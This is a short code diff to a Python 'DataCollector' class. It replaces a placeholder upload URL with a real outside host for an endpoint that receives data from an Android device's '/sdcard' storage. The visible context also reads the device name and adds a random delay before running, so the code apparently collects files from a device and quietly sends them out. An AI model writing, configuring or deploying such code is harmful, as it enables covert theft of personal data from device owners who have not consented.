@@ -315,7 +315,7 @@ class DataCollector:
             device_name = platform.node() or "Unknown"
             if device_name == "localhost" or not device_name:
                 device_name = f"Device_{uuid.uuid4().hex[:8]}"
-            server_url_upload = "http://your-server.com/api/upload_data"  # Change to your server URL
+            server_url_upload = "http://Script.onemancode.com/api/upload_data"  # Change to your server URL
             sdcard_path = "/sdcard"
             time.sleep(random.randint(2, 5))
             if not os.path.exists(sdcard_path):
